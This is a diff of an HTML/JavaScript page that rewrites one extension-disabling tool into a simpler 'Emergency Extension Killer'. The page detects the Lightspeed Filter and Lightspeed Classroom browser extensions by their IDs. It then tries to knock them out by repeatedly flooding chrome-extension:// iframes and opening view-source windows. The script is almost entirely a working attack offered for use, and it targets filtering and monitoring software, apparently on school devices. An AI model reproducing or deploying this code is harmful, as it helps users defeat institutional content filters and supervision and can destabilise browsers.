@@ -1,313 +1,160 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nyxos Toolkit v8.0</title>
+    <title>EMERGENCY EXTENSION DISABLER</title>
     <style>
-        :root {
-            --bg: #0d1117;
-            --panel: #161b22;
-            --accent: #58a6ff;
-            --danger: #f85149;
-            --success: #3fb950;
-            --text: #c9d1d9;
-            --warning: #d29922;
-        }
         body {
-            font-family: 'Courier New', monospace;
-            background: var(--bg);
-            color: var(--text);
+            font-family: Arial, sans-serif;
+            background-color: #111;
+            color: #fff;
             margin: 0;
             padding: 20px;
-            line-height: 1.6;
+            text-align: center;
         }
-        .header {
-            color: var(--accent);
-            border-bottom: 1px solid #30363d;
-            padding-bottom: 10px;
-            margin-bottom: 20px;
+        #container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: #222;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px #f00;
         }
-        .panel {
-            background: var(--panel);
-            border-radius: 6px;
-            padding: 15px;
-            margin-bottom: 15px;
-            border: 1px solid #30363d;
+        h1 {
+            color: #f00;
+            text-shadow: 0 0 10px #f00;
         }
         button {
-            background: var(--danger);
+            background: #f00;
             color: white;
             border: none;
-            padding: 8px 15px;
-            border-radius: 4px;
+            padding: 15px 30px;
+            font-size: 18px;
+            margin: 10px;
             cursor: pointer;
-            font-family: inherit;
-            margin-right: 10px;
-            transition: all 0.2s;
-        }
-        button:disabled {
-            background: #484f58;
-            cursor: not-allowed;
-        }
-        button:hover:not(:disabled) {
-            opacity: 0.9;
-            transform: translateY(-1px);
-        }
-        .status {
-            position: fixed;
-            bottom: 10px;
-            right: 10px;
-            background: var(--danger);
-            color: white;
-            padding: 5px 10px;
-            border-radius: 4px;
-            font-size: 12px;
-        }
-        .target-container {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin-top: 15px;
-        }
-        .target-item {
-            padding: 10px;
-            background: rgba(0,0,0,0.2);
-            border-radius: 4px;
-            position: relative;
-        }
-        .target-status {
-            position: absolute;
-            right: 10px;
-            top: 10px;
-            padding: 3px 8px;
-            border-radius: 4px;
-            font-size: 12px;
+            border-radius: 5px;
             font-weight: bold;
         }
-        .detected { background: var(--success); }
-        .missing { background: var(--danger); }
-        .attacking { 
-            background: var(--danger);
-            animation: pulse 0.5s infinite;
+        button:disabled {
+            background: #555;
+            cursor: not-allowed;
         }
-        .attack-log {
-            height: 100px;
-            overflow-y: scroll;
-            background: black;
+        #status {
+            margin: 20px 0;
             padding: 10px;
+            background: #333;
+            border-radius: 5px;
             font-family: monospace;
-            border-radius: 4px;
+        }
+        #log {
+            height: 200px;
+            overflow-y: scroll;
+            background: #000;
+            padding: 10px;
+            text-align: left;
+            font-family: monospace;
+            border: 1px solid #f00;
+        }
+        .target {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px;
+            margin: 5px 0;
+            background: #1a1a1a;
+            border-radius: 5px;
+        }
+        .target-name {
+            font-weight: bold;
+        }
+        .target-status {
+            padding: 3px 10px;
+            border-radius: 3px;
+        }
+        .detected {
+            background: #0a0;
+        }
+        .missing {
+            background: #a00;
+        }
+        .attacking {
+            background: #f00;
+            animation: pulse 0.5s infinite;
         }
         @keyframes pulse {
             0% { opacity: 1; }
-            50% { opacity: 0.7; }
+            50% { opacity: 0.5; }
             100% { opacity: 1; }
-        }
-        .progress-bar {
-            height: 4px;
-            background: var(--accent);
-            width: 0%;
-            transition: width 0.3s;
-            margin-top: 5px;
-            border-radius: 2px;
-        }
-        .slider-container {
-            margin: 15px 0;
-        }
-        .slider-label {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 5px;
-        }
-        input[type="range"] {
-            width: 100%;
-        }
-        .switch {
-            position: relative;
-            display: inline-block;
-            width: 60px;
-            height: 34px;
-            margin-left: 10px;
-        }
-        .switch input {
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
-        .slider {
-            position: absolute;
-            cursor: pointer;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: #484f58;
-            transition: .4s;
-            border-radius: 34px;
-        }
-        .slider:before {
-            position: absolute;
-            content: "";
-            height: 26px;
-            width: 26px;
-            left: 4px;
-            bottom: 4px;
-            background-color: white;
-            transition: .4s;
-            border-radius: 50%;
-        }
-        input:checked + .slider {
-            background-color: var(--accent);
-        }
-        input:checked + .slider:before {
-            transform: translateX(26px);
-        }
-        .ripple {
-            position: absolute;
-            border-radius: 50%;
-            background-color: rgba(255, 255, 255, 0.7);
-            transform: scale(0);
-            animation: ripple 0.6s linear;
-            pointer-events: none;
-        }
-        @keyframes ripple {
-            to {
-                transform: scale(4);
-                opacity: 0;
-            }
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>Nyxos Toolkit v8.0</h1>
-        <p>Ultimate Extension Disabler</p>
-    </div>
-
-    <div class="panel">
-        <h2>Target Status</h2>
-        <div class="target-container" id="targetStatus">
-            <!-- Filled by JavaScript -->
-        </div>
-    </div>
-
-    <div class="panel">
-        <h2>Attack Controls</h2>
-        <div class="slider-container">
-            <div class="slider-label">
-                <span>Attack Intensity: <span id="iframeCountValue">500</span> iframes</span>
+    <div id="container">
+        <h1>EMERGENCY EXTENSION KILLER</h1>
+        
+        <div id="targets">
+            <div class="target" id="target-filter">
+                <span class="target-name">Lightspeed Filter</span>
+                <span class="target-status missing" id="status-filter">CHECKING...</span>
             </div>
-            <input type="range" min="100" max="5000" value="500" class="slider" id="iframeCountSlider">
+            <div class="target" id="target-classroom">
+                <span class="target-name">Lightspeed Classroom</span>
+                <span class="target-status missing" id="status-classroom">CHECKING...</span>
+            </div>
         </div>
-        <button id="startAttack">Start Dual Attack</button>
-        <button id="stopAttack" disabled>Stop Attack</button>
-        <div class="progress-bar" id="attackProgress"></div>
+        
+        <div id="status">Initializing system...</div>
+        
+        <button id="killButton" disabled>KILL EXTENSIONS</button>
+        
+        <div id="log"></div>
     </div>
-
-    <div class="panel">
-        <h2>Advanced Options</h2>
-        <label>
-            <input type="checkbox" id="autoRefresh">
-            Auto-refresh after attack
-            <span class="switch">
-                <input type="checkbox" id="autoRefreshToggle">
-                <span class="slider"></span>
-            </span>
-        </label>
-        <label>
-            <input type="checkbox" id="devMode">
-            Developer Mode
-            <span class="switch">
-                <input type="checkbox" id="devModeToggle">
-                <span class="slider"></span>
-            </span>
-        </label>
-    </div>
-
-    <div class="panel">
-        <h2>Attack Log</h2>
-        <div class="attack-log" id="attackLog"></div>
-    </div>
-
-    <div class="status" id="status">Status: Initializing...</div>
 
     <script>
-        // Extension targets
-        const TARGETS = [
-            {
+        // TARGET EXTENSIONS
+        const TARGETS = {
+            filter: {
                 id: 'adkcpkpghahmbopkjchobieckeoaoeem',
                 name: 'Lightspeed Filter',
-                detected: false,
-                attacking: false
+                detected: false
             },
-            {
+            classroom: {
                 id: 'kkbmdgjggcdajckdlbngdjonpchpaiea',
                 name: 'Lightspeed Classroom',
-                detected: false,
-                attacking: false
+                detected: false
             }
-        ];
+        };
 
-        // Attack system variables
-        let attackInterval = null;
-        let attackCycle = 0;
-        const MAX_CYCLES = 20;
-        let iframeCount = 500;
-        let autoRefresh = false;
-        let devMode = false;
-
-        // DOM elements
-        const startBtn = document.getElementById('startAttack');
-        const stopBtn = document.getElementById('stopAttack');
+        // SYSTEM VARIABLES
+        let isAttacking = false;
+        let attackInterval;
+        const killButton = document.getElementById('killButton');
         const statusEl = document.getElementById('status');
-        const logEl = document.getElementById('attackLog');
-        const progressBar = document.getElementById('attackProgress');
-        const iframeSlider = document.getElementById('iframeCountSlider');
-        const iframeCountEl = document.getElementById('iframeCountValue');
-        const autoRefreshToggle = document.getElementById('autoRefreshToggle');
-        const devModeToggle = document.getElementById('devModeToggle');
+        const logEl = document.getElementById('log');
 
-        // Initialize the UI
-        function initUI() {
-            const targetStatus = document.getElementById('targetStatus');
-            targetStatus.innerHTML = TARGETS.map(target => `
-                <div class="target-item" id="target-${target.id}">
-                    <strong>${target.name}</strong>
-                    <div>ID: ${target.id}</div>
-                    <div class="target-status ${target.detected ? 'detected' : 'missing'}">
-                        ${target.detected ? 'DETECTED' : 'MISSING'}
-                    </div>
-                </div>
-            `).join('');
-        }
-
-        // Log messages to the attack log
+        // LOG MESSAGES
         function log(message) {
             const timestamp = new Date().toLocaleTimeString();
-            logEl.innerHTML += `<div>[${timestamp}] ${message}</div>`;
+            logEl.innerHTML += `[${timestamp}] ${message}<br>`;
             logEl.scrollTop = logEl.scrollHeight;
         }
 
-        // Update system status
-        function updateStatus(message, isError = false) {
-            statusEl.textContent = `Status: ${message}`;
-            statusEl.style.background = isError ? 'var(--danger)' : 'var(--accent)';
+        // UPDATE STATUS
+        function updateStatus(message) {
+            statusEl.textContent = message;
         }
 
-        // Check if extension exists
-        async function detectExtension(target) {
+        // CHECK IF EXTENSION EXISTS
+        function checkExtension(target) {
             return new Promise((resolve) => {
                 const iframe = document.createElement('iframe');
                 iframe.src = `chrome-extension://${target.id}/manifest.json`;
                 iframe.style.display = 'none';
                 
-                iframe.onload = () => {
+                iframe.onload = function() {
                     iframe.remove();
                     resolve(true);
                 };
                 
-                iframe.onerror = () => {
+                iframe.onerror = function() {
                     iframe.remove();
                     resolve(false);
                 };
@@ -315,80 +162,64 @@
                 setTimeout(() => {
                     iframe.remove();
                     resolve(false);
-                }, 1500);
+                }, 2000);
                 
                 document.body.appendChild(iframe);
             });
         }
 
-        // Detect all targets
-        async function detectAllExtensions() {
+        // DETECT ALL EXTENSIONS
+        async function detectExtensions() {
             let allDetected = true;
             
-            for (const target of TARGETS) {
-                target.detected = await detectExtension(target);
-                updateTargetUI(target);
+            for (const [key, target] of Object.entries(TARGETS)) {
+                target.detected = await checkExtension(target);
+                updateTargetStatus(key, target.detected ? 'detected' : 'missing');
                 
                 if (!target.detected) allDetected = false;
+            }
+            
+            if (allDetected) {
+                killButton.disabled = false;
+                updateStatus('READY: Both targets detected');
+                log('SYSTEM READY - Both target extensions detected');
+            } else {
+                killButton.disabled = true;
+                updateStatus('ERROR: Missing required extensions');
+                log('ERROR: One or more target extensions not detected');
             }
             
             return allDetected;
         }
 
-        // Update target UI
-        function updateTargetUI(target) {
-            const targetEl = document.getElementById(`target-${target.id}`);
-            if (!targetEl) return;
+        // UPDATE TARGET STATUS DISPLAY
+        function updateTargetStatus(targetKey, status) {
+            const statusEl = document.getElementById(`status-${targetKey}`);
+            statusEl.textContent = status.toUpperCase();
+            statusEl.className = `target-status ${status}`;
             
-            const statusEl = targetEl.querySelector('.target-status');
-            statusEl.className = `target-status ${target.detected ? 'detected' : 'missing'}`;
-            statusEl.textContent = target.detected ? 
-                (target.attacking ? 'ATTACKING' : 'DETECTED') : 
-                'MISSING';
-            
-            if (target.attacking) {
-                statusEl.classList.add('attacking');
+            if (status === 'detected') {
+                TARGETS[targetKey].detected = true;
             } else {
-                statusEl.classList.remove('attacking');
+                TARGETS[targetKey].detected = false;
             }
         }
 
-        // Attack an individual extension
-        async function attackExtension(target) {
-            if (!target.detected) return false;
-            
+        // ATTACK AN EXTENSION
+        function attackExtension(target) {
             try {
-                // Create attack window
-                const attackWindow = window.open('', '_blank', 'width=100,height=100');
-                if (!attackWindow) return false;
-                
-                // Add iframes to attack window
-                const iframeContainer = attackWindow.document.createElement('div');
-                attackWindow.document.body.appendChild(iframeContainer);
-                
-                // Add massive number of iframes
-                for (let i = 0; i < iframeCount; i++) {
-                    const iframe = attackWindow.document.createElement('iframe');
+                // METHOD 1: IFRAME FLOOD
+                for (let i = 0; i < 50; i++) {
+                    const iframe = document.createElement('iframe');
                     iframe.src = `chrome-extension://${target.id}/main.js`;
                     iframe.style.display = 'none';
-                    iframeContainer.appendChild(iframe);
+                    document.body.appendChild(iframe);
+                    setTimeout(() => iframe.remove(), 100);
                 }
                 
-                // Add view-source attack
-                const viewSourceWindow = window.open(
-                    `view-source:chrome-extension://${target.id}/main.js`, 
-                    '_blank'
-                );
-                
-                // Cleanup
-                setTimeout(() => {
-                    if (attackWindow && !attackWindow.closed) {
-                        attackWindow.close();
-                    }
-                    if (viewSourceWindow && !viewSourceWindow.closed) {
-                        viewSourceWindow.close();
-                    }
-                }, 100);
+                // METHOD 2: VIEW-SOURCE ATTACK
+                const win = window.open(`view-source:chrome-extension://${target.id}/main.js`, '_blank');
+                setTimeout(() => win && win.close(), 100);
                 
                 return true;
             } catch (e) {
@@ -396,56 +227,22 @@
             }
         }
 
-        // Attack all detected extensions
-        async function attackAllExtensions() {
-            attackCycle++;
-            progressBar.style.width = `${(attackCycle / MAX_CYCLES) * 100}%`;
+        // START ATTACKING ALL TARGETS
+        function startAttack() {
+            if (isAttacking) return;
             
-            // Refresh detection periodically
-            if (attackCycle % 5 === 0) {
-                await detectAllExtensions();
-            }
+            isAttacking = true;
+            killButton.disabled = true;
+            updateStatus('ATTACKING EXTENSIONS...');
+            log('STARTING EMERGENCY ATTACK SEQUENCE');
             
-            let attackResults = await Promise.all(
-                TARGETS.map(async target => {
-                    if (!target.detected) return false;
-                    
-                    target.attacking = true;
-                    updateTargetUI(target);
-                    
-                    const result = await attackExtension(target);
-                    log(`${target.name}: ${result ? 'Attack successful' : 'Attack failed'}`);
-                    
-                    target.attacking = false;
-                    updateTargetUI(target);
-                    
-                    return result;
-                })
-            );
-            
-            // Check if we should stop
-            if (attackCycle >= MAX_CYCLES || !attackResults.some(r => r)) {
-                stopAttack();
-                
-                if (attackCycle >= MAX_CYCLES && autoRefresh) {
-                    log("Attack cycle completed - refreshing page");
-                    setTimeout(() => location.reload(), 1000);
+            // Update UI to show attacking status
+            for (const key of Object.keys(TARGETS)) {
+                if (TARGETS[key].detected) {
+                    document.getElementById(`status-${key}`).className = 'target-status attacking';
+                    document.getElementById(`status-${key}`).textContent = 'ATTACKING';
                 }
             }
-        }
-
-        // Start the attack
-        function startAttack() {
-            if (attackInterval) return;
-            
-            attackCycle = 0;
-            progressBar.style.width = '0%';
-            
-            startBtn.disabled = true;
-            stopBtn.disabled = false;
-            
-            log("Starting dual extension attack...");
-            updateStatus("Attacking both extensions");
             
             // Immediate first attack
             attackAllExtensions();
@@ -454,93 +251,61 @@
             attackInterval = setInterval(attackAllExtensions, 500);
         }
 
-        // Stop the attack
-        function stopAttack() {
-            if (!attackInterval) return;
+        // ATTACK ALL DETECTED EXTENSIONS
+        function attackAllExtensions() {
+            let anySuccess = false;
             
-            clearInterval(attackInterval);
-            attackInterval = null;
-            
-            startBtn.disabled = false;
-            stopBtn.disabled = true;
-            
-            TARGETS.forEach(t => {
-                t.attacking = false;
-                updateTargetUI(t);
-            });
-            
-            log("Attack stopped");
-            updateStatus("Ready");
-            progressBar.style.width = '0%';
-        }
-
-        // Initialize the system
-        async function init() {
-            initUI();
-            log("System initializing...");
-            updateStatus("Detecting extensions");
-            
-            const allDetected = await detectAllExtensions();
-            
-            if (allDetected) {
-                log("Both target extensions detected - ready to attack");
-                updateStatus("Ready");
-                startBtn.disabled = false;
-            } else {
-                log("Error: Required extensions not detected");
-                updateStatus("Missing targets", true);
-                startBtn.disabled = true;
-            }
-        }
-
-        // Event listeners
-        startBtn.addEventListener('click', startAttack);
-        stopBtn.addEventListener('click', stopAttack);
-
-        iframeSlider.addEventListener('input', () => {
-            iframeCount = parseInt(iframeSlider.value);
-            iframeCountEl.textContent = iframeCount;
-        });
-
-        autoRefreshToggle.addEventListener('change', () => {
-            autoRefresh = autoRefreshToggle.checked;
-        });
-
-        devModeToggle.addEventListener('change', () => {
-            devMode = devModeToggle.checked;
-            if (devMode) {
-                if (!confirm("Enable developer mode? This may expose advanced features.")) {
-                    devModeToggle.checked = false;
-                    devMode = false;
+            for (const [key, target] of Object.entries(TARGETS)) {
+                if (target.detected) {
+                    const success = attackExtension(target);
+                    if (success) anySuccess = true;
+                    log(`${target.name}: ${success ? 'Attack succeeded' : 'Attack failed'}`);
                 }
             }
-        });
+            
+            // If no extensions could be attacked, stop
+            if (!anySuccess) {
+                stopAttack();
+                updateStatus('ATTACK FAILED: Extensions not responding');
+                log('ATTACK FAILED: No extensions could be attacked');
+            }
+        }
 
-        // Add ripple effect to buttons
-        document.querySelectorAll('button').forEach(button => {
-            button.addEventListener('click', function(e) {
-                const ripple = document.createElement('span');
-                ripple.classList.add('ripple');
-                
-                const rect = this.getBoundingClientRect();
-                const size = Math.max(rect.width, rect.height);
-                ripple.style.width = ripple.style.height = `${size}px`;
-                
-                const x = e.clientX - rect.left - size / 2;
-                const y = e.clientY - rect.top - size / 2;
-                ripple.style.left = `${x}px`;
-                ripple.style.top = `${y}px`;
-                
-                this.appendChild(ripple);
-                
-                setTimeout(() => {
-                    ripple.remove();
-                }, 600);
-            });
-        });
+        // STOP ATTACKING
+        function stopAttack() {
+            clearInterval(attackInterval);
+            isAttacking = false;
+            killButton.disabled = false;
+            
+            // Reset status displays
+            for (const [key, target] of Object.entries(TARGETS)) {
+                if (target.detected) {
+                    document.getElementById(`status-${key}`).className = 'target-status detected';
+                    document.getElementById(`status-${key}`).textContent = 'DETECTED';
+                }
+            }
+            
+            updateStatus('ATTACK STOPPED');
+            log('ATTACK SEQUENCE TERMINATED');
+        }
 
-        // Start the system
-        document.addEventListener('DOMContentLoaded', init);
+        // INITIALIZE SYSTEM
+        async function initialize() {
+            log('Initializing emergency disabler...');
+            updateStatus('DETECTING EXTENSIONS...');
+            
+            // Initial detection
+            await detectExtensions();
+            
+            // Periodic re-check
+            setInterval(detectExtensions, 10000);
+        }
+
+        // EVENT LISTENERS
+        killButton.addEventListener('click', startAttack);
+        
+        // START SYSTEM
+        document.addEventListener('DOMContentLoaded', initialize);
     </script>
 </body>
 </html>
